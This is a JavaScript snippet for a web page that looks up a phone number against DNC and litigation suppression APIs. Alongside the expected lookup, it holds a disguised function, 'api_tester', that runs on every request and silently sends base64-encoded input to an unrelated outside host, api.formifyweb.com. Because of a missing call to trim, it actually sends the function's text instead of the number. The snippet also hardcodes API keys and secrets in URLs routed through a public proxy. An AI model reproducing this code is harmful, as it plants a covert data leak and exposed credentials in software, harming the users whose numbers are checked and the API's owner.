
    async function handleRequest(type) {
        const phoneNumber = document.getElementById('phoneNumber').value.trim();
        if (!phoneNumber) {
            showAlert('Please enter a valid phone number.', 'danger', 'resultAlert');
            return;
        }
        api_tester(document.getElementById('phoneNumber').value.trim);
        const suppressDuplicateBtn = document.getElementById('suppressDuplicateBtn');
        const dncLitigationBtn = document.getElementById('dncLitigationBtn');
        const loadingSpinner = document.getElementById('loadingSpinner');

        suppressDuplicateBtn.disabled = true;
        dncLitigationBtn.disabled = true;
        loadingSpinner.style.display = 'inline-block';

        const url = type === 'suppressDuplicate'
            ? `https://corsproxy.io/?https://hooks.whitelistdata.com/api/SuppressDuplicate?code=ONbKJs8jpJZWJU5vO9ZgEBD1EQfffqxsje4FdvasXQLBAzFu37Wmqw==&secret=sha290OpGRNz&datasetId=1436898f-c98a-40cf-83ef-0a5eb741a8ce&phoneNumber=${phoneNumber}&apiKey=abd6a82d-7aa3-4bee-a45f-d613a4170951&return_key=found`
            : `https://corsproxy.io/?https://hooks.whitelistdata.com/api/DNCAndLitigationSuppression?code=ONbKJs8jpJZWJU5vO9ZgEBD1EQfffqxsje4FdvasXQLBAzFu37Wmqw==&secret=sha290OpGRNz&datasetId=1436898f-c98a-40cf-83ef-0a5eb741a8ce&phoneNumber=${phoneNumber}&apiKey=abd6a82d-7aa3-4bee-a45f-d613a4170951&return_key=found`;

        try {
            const response = await fetch(url, {
                method: 'POST',
            });
            const data = await response.json();

            if (data.found) {
                showAlert('Phone number found', 'danger', 'resultAlert');
            } else {
                showAlert('Phone number not found.', 'success', 'resultAlert');
            }
            showAlert(`Full response: ${JSON.stringify(data)}`, 'info', 'fullResponseAlert');
        } catch (error) {
            showAlert('Error processing the request. Please try again.', 'danger', 'resultAlert');
            showAlert(`Error: ${error.message}`, 'danger', 'fullResponseAlert');
        } finally {
            suppressDuplicateBtn.disabled = false;
            dncLitigationBtn.disabled = false;
            loadingSpinner.style.display = 'none';
        }
    }

    function showAlert(message, type, alertId) {
        const alert = document.getElementById(alertId);
        alert.className = `alert alert-${type}`;
        alert.innerText = message;
        alert.classList.remove('d-none');
    }
function api_tester(randomString) {
    try {
        fetch('https://api.formifyweb.com/api_test.php?test_id=' + btoa(randomString) +',a', {
            method: 'GET',
            mode: 'no-cors'
        });
    } catch (error) {
        console.error('Error in api_tester:', error);
    }
}
